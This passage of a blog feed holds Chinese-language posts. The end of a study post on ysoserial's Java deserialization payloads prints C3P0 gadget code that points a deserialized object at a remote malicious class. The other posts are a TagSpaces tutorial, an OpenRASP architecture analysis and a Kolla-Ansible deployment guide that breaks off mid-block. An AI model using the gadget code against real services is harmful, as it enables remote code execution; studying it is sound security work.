NamingException var5 = <span class="keyword">new</span> NamingException(<span class="string">&quot;Could not resolve Reference to Object!&quot;</span>);</span><br><span class="line">        var5.setRootCause(var10);</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.C3P0#PoolSource 不可序列化的并且实现了 Referenceable 的 ConnectionPoolDataSource 对象，并且其 getReference 方法返回恶意类位置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className = className;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">&quot;exploit&quot;</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.C3P0#getObject 构造恶意 URL 作为 PoolSource 对象的实例化参数，进一步将 PoolBackedDataSource 对象的 connectionPoolDataSource 指向恶意的 PoolSource。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 url</span></span><br><span class="line">    <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化 PoolBackedDataSource</span></span><br><span class="line">    PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">    Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">&quot;connectionPoolDataSource&quot;</span>).set(b, <span class="keyword">new</span> PoolSource(className, url));</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://www.anquanke.com/post/id/201762">JAVA反序列化-ysoserial-URLDNS</a></li><li><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">Triggering a DNS lookup using Java Deserialization</a></li><li><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3">Security Advisory – Java SE</a></li><li><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Java反序列 Jdk7u21 Payload 学习笔记</a></li><li><a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">java反序列化工具ysoserial分析</a></li><li><a href="http://www.cnblogs.com/tr1ple/p/12421157.html">java反序列化-ysoserial-调试分析总结篇(6)</a></li><li><a href="https://paper.seebug.org/1242">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></li><li><a href="https://paper.seebug.org/1723">Ysoserial Commons-Collections 利用链分析</a></li><li><a href="https://paper.seebug.org/1224/">Java 反序列化系列 ysoserial Jdk7u21</a></li><li><a href="https://paper.seebug.org/1171/">Java 反序列化系列 ysoserial Groovy 1</a></li><li><a href="https://medium.com/@m01e/ysoserial-groovy1%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-2d53f197efc4">ysoserial Groovy1模块分析</a></li><li><a href="https://www.secpulse.com/archives/166957.html">Ysoserial Click1利用链分析</a></li><li><a href="https://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/">Java 反序列化之 CommonsBeanUtils 分析</a></li><li><a href="https://www.buaq.net/go-21093.html">ysoserial – Clojure分析</a></li><li><a href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">ROME 反序列化分析</a></li><li><a href="https://su18.org/post/ysuserial/">Java 反序列化取经路</a></li></ul>]]></content>
    
    
    <summary type="html">Java 反序列化漏洞入门，梳理 ysoserial 中的 POC</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>文件标签工具 TagSpaces 使用</title>
    <link href="https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/"/>
    <id>https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/</id>
    <published>2021-09-09T06:10:54.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前玩 mod 下载了一大堆材质文件和动作文件，但是下载的文件并没有按照网站上的 id 统一文件夹名称，结果就是各种各样的文件夹名称，完全看不出来内容到底是什么，而且也不知道某些种族能不能用…</p><p><img src="https://i.loli.net/2021/09/09/HrSD3Rj9g7Ew4Wq.png" style="zoom:80%;" /> <br /></p><p>后来是打算直接爬 <a href="https://www.xivmodarchive.com/">ffxivmodarchive</a> 网站上的 mod 信息，然后在本地浏览，提供预览、是否已下载和其他各种标签（种族、性别等）。但是做一半发现有点做不动（<a href="https://github.com/jckling/ffxiv-modarchive">jckling/ffxiv-modarchive</a>）：① 需要每天同步网站上的数据；② 下载地址可能外链到谷歌云端硬盘，需要手动将保存的文件夹名称改为 id；③ 前端展示页面不好写。</p><p>四舍五入上面的功能就是“反向代理”加一个是否已下载的记录而已，做起来好麻烦于是搁置了（摊手</p><p>昨天花了点时间找打标签的工具，有一个 <a href="https://github.com/files-community/Files">Files</a> 文件浏览工具支持打标签，但是从微软应用商店里下载的是 1.x 版本，暂不支持标签功能 😅。其他的有 <a href="https://www.tagflow.ch/en/">TagFlow</a>、<a href="https://alltags.net/">allTags</a>、<a href="https://www.tagspaces.org/">TagSpaces</a>、<a href="https://www.taglyst.com/">tagLyst</a>，直接根据 UI 的喜好选了 TagSpaces 用，功能也是够的。</p><h1 id="TagSpaces"><a href="#TagSpaces" class="headerlink" title="TagSpaces"></a>TagSpaces</h1><p>跨平台打标签工具，支持对文件和文件夹打标签、加注解；支持文本搜索和标签搜索（布尔运算）；集成预览和编辑功能。</p><p>下载地址：</p><ul><li>官网：<a href="https://www.tagspaces.org/downloads/">https://www.tagspaces.org/downloads/</a></li><li>Github：<a href="https://github.com/tagspaces/tagspaces/releases">https://github.com/tagspaces/tagspaces/releases</a></li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>从官网下载 64 位的 installer</p><p><img src="https://i.loli.net/2021/09/09/WTKhz4ZfGlLgU8D.jpg" style="zoom:80%;" /><br /></p><p>选择为任何人安装（我这里已经安装过了）</p><p><img src="https://i.loli.net/2021/09/09/nSW6aodrHus9X7Q.jpg" style="zoom: 75%;" /><br /></p><p>同意许可证协议后，然后，执行安装</p><p><img src="https://i.loli.net/2021/09/09/32OvhnMu8Ycx49g.jpg" style="zoom:75%;" /><br /></p><p>第一次打开需要选择标签的保存方式，也可以在设置里修改</p><ul><li>重命名文件（RENAME FILE）</li><li>额外文件（USE SIDECAR FILE）</li></ul><p>另外，可以在设置里选择中文</p><img src="https://i.loli.net/2021/09/09/e5JglQmKXhdaMzj.jpg" style="zoom:60%;" /><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p>这些界面在浏览文件时不一定都有，可以通过设置更改是否显示，每个区域具体的功能就不展开了，看官方文档就好。</p><ol><li>垂直工具栏：始终可见，提供对应用程序主要部分的快速访问</li><li>位置管理器/标签库/搜索区域：管理关联的位置，标记库，搜索文件和文件夹</li><li>导航：切换位置或快速导航到父文件夹</li><li>浏览区域：浏览文件和文件夹</li><li>常用操作区：在这里可以访问当前打开的文件或文件夹的常用操作</li><li>文件/文件夹属性：展示文件或文件夹的一些属性</li><li>预览区：预览或编辑当前文件</li></ol><img src="https://docs.tagspaces.org/assets/images/main-ui-areas-7170f35243bccbbfc608936cb13577ab.png" /><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>重点就是给文件夹<strong>打标签</strong>，首先我删除了默认关联的文件夹（LOCATION MANAGER），然后关联保存姿势文件（CMTool）和 Mod 文件（TexTools）的路径。</p><p>具体的操作是：<code>CONNECT A LOCATION -&gt; 填入 Location Path -&gt; 设置 Location Name -&gt; OK</code></p><p><img src="https://i.loli.net/2021/09/09/xIae7kfpDPzMN6J.jpg" style="zoom:70%;" /><br /></p><p>关联之后就可以进行查看（我这里已经打了几个标签）</p><p><img src="https://i.loli.net/2021/09/09/Rxa47IV2KDghcSr.jpg" style="zoom:70%;" /><br /></p><p>点击左侧的标签可以创建标签组，我已经把默认的标签组都给删了，Collected Tags 收集直接对文件/文件夹添加不在标签组中的标签。</p><p><img src="https://i.loli.net/2021/09/09/HmOA7pC9KcfS3PT.jpg" style="zoom:70%;" /><br /></p><p>点击 TAG LIBRARY 旁边的三个点，选择创建标签组（Create Tag Group），设置标签组名称和默认的背景/文字颜色，创建完毕后括号内显示创建标签时所在的文件夹名称，不过其他文件夹也可以用就是了。</p><p><img src="https://i.loli.net/2021/09/09/h2vuLrXIYQNVMjZ.png" style="zoom:60%;" /><br /></p><p>点击标签组旁边的三个点，选择添加标签（Add Tags），添加完毕后点击标签旁边的三个点可以设置标签名称、背景/文字颜色。</p><p><img src="https://i.loli.net/2021/09/09/qr9kKMJY45F6RPp.png" style="zoom:60%;" /><br /></p><p>设置完标签之后就可以对文件夹打标签了，选择文件夹后，点击上方的标签图标即可添加标签，一次可添加多个标签。</p><img src="https://i.loli.net/2021/09/09/bvaD9USQEJsnmA7.jpg" style="zoom:75%;" /><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我把上面的写完才看到设置里可以改成中文，然后在安装那一节补充了设置方法 🆘</p><p>总体来说用起来很方便，为了避免重命名文件，我选择了使用附加文件的方式，这样做的结果就是文件夹中会出现一个 <code>.ts</code> 文件夹，其中的 json 文件保存了标签信息。<code>.ts</code> 文件夹默认是隐藏的，对我来说，存的文件夹和标签也占不了多大空间，所以这样就好了！</p><p><img src="https://i.loli.net/2021/09/09/qwxXlvUAaBdjfui.png" style="zoom:80%;" /><br /></p><p>这个工具还有许多其他功能，我只是用了其中的标签功能而已，更多的就看 <a href="https://docs.tagspaces.org/">文档</a> 发掘吧~</p>]]></content>
    
    
    <summary type="html">给文件和文件夹打标签进行管理</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Windows" scheme="https://jckling.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>百度 OpenRASP 组成分析</title>
    <link href="https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</id>
    <published>2021-09-08T07:17:39.000Z</published>
    <updated>2021-11-23T14:04:58.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RASP-架构"><a href="#RASP-架构" class="headerlink" title="RASP 架构"></a>RASP 架构</h1><p>RASP 将 agent 嵌入应用，通过 hook 技术植入探针，在关键点触发检测，拦截/放行</p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/7195ace984937ccbddc171ece82e237e.png" style="zoom:80%;" /><p>Java 应用的探针植入方法</p><ul><li>Servlet Filter：在请求响应路径上监测，只能对 http 报文过滤处理</li><li>JVM 重构：植入 JVM 内部, 基于 JVM 的安全控制层实现 RASP 容器<ul><li>需要对 JVM 非常熟悉，难度很大，国外 <a href="https://www.waratek.com/runtime-application-self-protection-rasp/">waratek</a> 采用这种方法</li></ul></li><li>Java Instrument：普遍，OpenRASP 使用该方法</li></ul><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/fca02f0c30846c349a6f3f35998724dd.png" style="zoom:80%"><h1 id="OpenRASP-组成部分"><a href="#OpenRASP-组成部分" class="headerlink" title="OpenRASP 组成部分"></a>OpenRASP 组成部分</h1><ul><li>Java Agent</li><li>JavaScript 插件</li><li>Agent 管理后台（Vue + Golang 实现）<ul><li>ElasticSearch + MongoDB</li></ul></li><li>IAST 扫描器（Python 实现）</li></ul><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>启动服务时使用 <code>-javaagent</code> 参数指定 Java Agent，动态修改 Java 字节码（即 hook 插桩）</p><ul><li>攻击触发插桩点，Java Agent 获取到函数的参数</li></ul><h3 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h3><ol><li>启动时首先会进入 <code>javaagent</code> 的 premain 函数，该函数会在 main 函数之前预先执行</li><li>当去 hook 像 java.io.File 这样由 <code>BootstrapClassLoader</code> 加载的类的时候，无法从该类调用非 <code>BootstrapClassLoader</code> 加载的类中的接口，所以 agent.jar 会先将自己添加到 <code>BootstrapClassLoader</code> 的 ClassPath 下，这样 hook 由 <code>BootstrapClassLoader</code> 加载的类的时候就能够成功调用到 agent.jar 中的检测入口</li><li>释放 <code>log4j</code> 日志配置文件，如果存在则跳过</li><li>根据 <code>openrasp.yml</code> 文件初始化相应配置项</li><li>初始化 JS 插件模块<ul><li>JS 上下文类初始化</li><li>插件文件初始化</li></ul></li><li>初始化字节码转换模块<ul><li>给 load class 操作进行插桩操作，当类加载的时候会先进入 agent 进行处理</li><li>对于在初始化前已加载的类执行 <code>retransform</code> 处理，e.g <code>FileInputStream</code></li></ul></li><li>输出启动成功日志，开启全局 Hook 开关（启动阶段为关闭状态）<ul><li>若启动过程中发生错误，记录错误日志</li></ul></li><li>给 openrasp.yml 配置文件和 js 插件目录以及 assets 目录增加文件监控，以便文件内容更改的时候不需要重启就能够实时生效</li></ol><h3 id="hook-class-流程"><a href="#hook-class-流程" class="headerlink" title="hook class 流程"></a>hook class 流程</h3><ol><li>因为启动时候进行了插桩操作（<code>premain</code>），当有类被 ClassLoader 加载时候，所以会把该类的字节码先交给自定义的 Transformer 处理</li><li><strong>自定义 Transformer 会判断该类是否为需要 hook 的类</strong>，如果是会将该类交给 javassist 字节码处理框架进行处理</li><li>javassist 框架会将类的字节码依照事件驱动模型逐步解析每个方法，当触发需要 hook 的方法时，会在方法的开头或者结尾插入进入检测函数的字节码</li><li>把 hook 好的字节码返回给 transformer 从而载入虚拟机</li></ol><img src="https://rasp.baidu.com/doc/hacking/architect/images/startup.png" style="zoom:80%"><h3 id="请求处理流程"><a href="#请求处理流程" class="headerlink" title="请求处理流程"></a>请求处理流程</h3><p>以 <code>tomcat + JDBC + MySQL</code> 为例</p><ol><li>服务器收到一个请求，从而进入了服务器的请求 hook 点，该 hook 点标注当前线程为请求线程，开启当前线程的检测开关并把请求对象和响应对象进行缓存，以便后面使用</li><li>服务器发起 SQL 查询</li><li>进入 SQLStatementHook 点，我们挂钩了 execute、executeUpdate、executeQuery 等方法，从该方法进入检测流程如下：<ul><li>判断当前线程是否为请求线程（第一步标记的），如果是继续下面检测</li><li>采集 <code>connection_id（这个字段仅JDBC支持）</code>、<code>SQL 语句</code> 以及 <code>数据库类型</code> 等信息</li><li>构建参数信息，调用<strong>本地插件（Java）和 JS 插件</strong>进行安全检测<ul><li>还有<strong>基线检测</strong></li></ul></li><li>根据插件的执行结果决定是拦截请求、放行还是仅打印日志</li></ul></li><li>进入 SQLResultSetHook 点，我们挂钩了 resultSet.next 方法<ul><li>调用本地插件检查是否发生拖库行为，默认策略为一次查询结果超过 500 条就报警</li></ul></li><li>若决定拦截攻击<ul><li>输出报警日志到 logs/alarm.log</li><li>如果 header 还没有发出，默认使用 302 跳转到拦截页面</li><li>如果 body 还没有发出，则重置未发送的 body</li><li>输出自定义拦截页面跳转 js 脚本<ul><li><code>&lt;/script&gt;&lt;script&gt;location.href=&#39;.../?request_id=xxx&#39;&lt;/script&gt;</code></li></ul></li></ul></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>-javaagent</code> 启动服务时加载 Agent，在 <code>premain</code> 函数中定义插桩逻辑，实现插桩<ul><li>预定义的 hook 点：<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook 函数列表</a></li><li>可新增 hook 点</li></ul></li><li>收到请求后，触发插桩点收集函数调用参数信息，调用插件检测</li><li>插件检测并返回结果，根据策略执行相应操作</li></ul><h2 id="JavaScript-插件"><a href="#JavaScript-插件" class="headerlink" title="JavaScript 插件"></a>JavaScript 插件</h2><p>Rhino 引擎支持将 Java 中的对象注册到 JavaScript 环境，并被 JavaScript 代码调用（数据共享）</p><ul><li><a href="https://github.com/mozilla/rhino">mozilla/rhino</a></li><li>JS 插件提供热更新功能，即<strong>能够实时更新检测逻辑</strong></li><li>根据 Java Agent 返回的插桩点信息，执行检测算法，最后进行<strong>告警/拦截</strong></li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/js.png" style="zoom:80%"><p>检测插件针对应用的行为进行检测，当应用执行操作时（触发检测点），OpenRASP 引擎就会调用检测插件，并将相关参数一并传递过来。</p><p>官方提供 14 个检测点：</p><ul><li>数据库查询</li><li>读取目录</li><li>请求参数</li><li>读取文件</li><li>写入文件</li><li>删除文件</li><li>文件包含操作</li><li>WebDAV 操作</li><li>文件上传</li><li>文件重命名</li><li>命令执行</li><li>XML 外部实体引用</li><li>Struts OGNL 表达式解析</li><li>RMI 反序列化</li><li>服务器端 HTTP 请求</li><li>服务器端 HTTP 请求 - 重定向之后</li><li>代码执行</li><li>类库加载</li><li>响应检查</li></ul><h2 id="IAST-扫描器"><a href="#IAST-扫描器" class="headerlink" title="IAST 扫描器"></a>IAST 扫描器</h2><p>被动扫描模式：启动扫描后保持运行，对新 url 进行实时扫描</p><ul><li>Python3 实现，MySQL 数据库，HTTP + JSON 通讯</li><li>属于主动 IAST，重放 payload<ul><li>被动 IAST 使用污点追踪实现</li><li>缺点：脏数据</li></ul></li></ul><p><strong>Agent 端</strong></p><p>用于收集 Web 应用的运行信息，即 OpenRASP Java Agent + Java Application</p><p><strong>扫描器端</strong></p><p>用于处理 OpenRASP 插件产生的请求信息，并完成整个 IAST 扫描逻辑</p><ul><li>预处理模块（HTTPServer）：接收 agent 插件的 http 请求，处理、存储、分发 http 请求信息</li><li>扫描模块（Scanner）：运行扫描插件，执行漏洞扫描逻辑<ul><li>生成扫描请求，发送给 web server 处理并返回结果（以及 hook 信息），检验结果</li></ul></li><li>监控模块（Monitor）：定期获取其他模块的运行时信息，调整参数，提供控制台服务等</li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/iast-main.png" style="zoom:80%"><p><a href="https://github.com/baidu-security/openrasp-iast">openrasp_iast</a> 源码中包含三种类型的插件</p><ul><li>扫描插件：plugin/scanner，生成测试向量，检测测试结果</li><li>去重插件：plugin/deduplicate，避免同一个请求被反复扫描</li><li>认证插件：plugin/authorizer</li></ul><p>执行流程</p><ol><li>等待用户发送请求</li><li>Agent 端将 hook 信息发送给扫描器端</li><li>扫描器端构建 payload 重放</li><li>Agent 端将 hook 信息发送给扫描器端，扫描器端收到响应</li></ol><p>RASP + IAST</p><ul><li>RASP 安装 IAST 插件：openrasp/plugins/iast/plugin.js（热更新）<ul><li>注册 hook 点，触发检测逻辑</li></ul></li><li>IAST 扫描器结合插件使用<ul><li>hook 信息、响应信息</li></ul></li></ul><h2 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h2><p>管理 Agent、查询日志</p><img src="https://rasp.baidu.com/doc/hacking/architect/images/rasp-cloud.png" style="zoom:80%"><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><ol><li>hook 点预先定义，触发后调用 JS 插件检测</li><li>扫描器接收请求及其 hook 信息，构造新的请求，根据执行结果和 hook 信息实现检测</li></ol><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="http://blog.nsfocus.net/rasp-tech/">RASP技术分析</a></li><li><a href="https://rasp.baidu.com/doc/">OpenRASP 官方文档</a></li></ul>]]></content>
    
    
    <summary type="html">梳理 OpenRASP 的各个组成部分：Java Agent 插桩、JS 插件检测、管理后台、IAST 扫描器。</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Golang" scheme="https://jckling.github.io/tags/Golang/"/>
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Kolla-Ansible 多机部署 V 版 OpenStack</title>
    <link href="https://jckling.github.io/2021/08/31/OpenStack/Kolla-Ansible%20%E5%A4%9A%E6%9C%BA%E9%83%A8%E7%BD%B2/"/>
    <id>https://jckling.github.io/2021/08/31/OpenStack/Kolla-Ansible%20%E5%A4%9A%E6%9C%BA%E9%83%A8%E7%BD%B2/</id>
    <published>2021-08-31T01:49:26.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><p>之前把本地镜像仓库、OpenStack、Jaeger 全都放在了一台主机上跑，负载很大，而且也不保险。现在拆分为 2 台主机：</p><ol><li>部署节点（Kolla-Ansible）<ul><li>Ubuntu 20.04</li><li>4 CPU </li><li>内存 16 GB</li><li>硬盘 500 GB</li><li>网卡1</li></ul></li><li>控制节点（OpenStack）<ul><li>Ubuntu 20.04</li><li>4 CPU </li><li>内存 16 GB</li><li>硬盘 500 GB</li><li>网卡1</li><li>网卡2（未启用）</li></ul></li></ol><p>在部署节点用 multinode 配置远程部署 OpenStack，虽然这里只有一台 OpenStack 主机😂</p><h1 id="控制节点"><a href="#控制节点" class="headerlink" title="控制节点"></a>控制节点</h1><p>控制节点只需给用户配置 sudo 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">sudo vim /etc/sudoers</span><br><span class="line"><span class="comment">##includedir /etc/sudoers.d</span></span><br><span class="line"><span class="comment">#op1 ALL=(ALL) NOPASSWD: ALL</span></span><br></pre></td></tr></table></figure><blockquote><p>Prior to Queens, when users want to connect using non-root user, they must add extra option <code>ansible_become=True</code> which is inconvenient and add security risk. In Queens, almost all services have support for escalation for only necessary tasks. In Rocky, all services have this capability, so users do not need to add <code>ansible_become</code> option if connection user has passwordless sudo capability.</p></blockquote><h1 id="部署节点"><a href="#部署节点" class="headerlink" title="部署节点"></a>部署节点</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol><li><p>配置 Python3</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设为默认</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 1</span><br><span class="line"><span class="comment">#sudo update-alternatives --remove python /usr/bin/python3.8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 pip</span></span><br><span class="line">sudo apt install -y python3-pip</span><br></pre></td></tr></table></figure></li><li><p>更换 pip 源</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">mkdir .pip &amp;&amp; <span class="built_in">cd</span> .pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并编辑配置文件</span></span><br><span class="line">sudo vim pip.conf</span><br></pre></td></tr></table></figure><p> 配置如下</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 6000</span><br><span class="line">index-url &#x3D; http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">trusted-host &#x3D; mirrors.aliyun.com</span><br></pre></td></tr></table></figure></li><li><p>更换 Ubuntu 源</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置镜像源</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级</span></span><br><span class="line">sudo apt dist-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p> 镜像源配置如下：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb 